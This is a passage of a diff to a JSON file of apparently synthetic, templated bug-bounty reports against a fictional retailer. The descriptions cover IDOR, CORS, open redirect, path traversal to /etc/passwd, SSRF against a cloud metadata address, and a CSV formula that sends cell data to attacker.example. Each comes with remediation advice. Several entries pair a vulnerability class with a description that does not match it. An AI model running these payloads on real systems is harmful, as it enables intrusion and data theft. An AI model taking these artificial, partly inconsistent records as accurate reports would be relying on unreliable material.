+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21480,7 +21640,8 @@
           "offset": "6d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21588,7 +21749,8 @@
           "offset": "3d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://shop.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21735,7 +21897,8 @@
           "offset": "8d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21863,7 +22026,8 @@
           "offset": "6d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21953,7 +22117,8 @@
           "offset": "16h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22121,7 +22286,8 @@
           "offset": "6d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://shop.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22291,7 +22457,8 @@
           "offset": "7d 16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22418,7 +22585,8 @@
           "offset": "4d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.zedernfeld-retail.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -22525,7 +22693,8 @@
           "offset": "4d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22668,7 +22837,8 @@
           "offset": "7d 10h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22811,7 +22981,8 @@
           "offset": "5d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://payments.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22970,7 +23141,8 @@
           "offset": "7d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23085,7 +23257,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.zedernfeld-retail.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23213,7 +23386,8 @@
           "offset": "1d 7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23312,7 +23486,8 @@
           "offset": "1d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
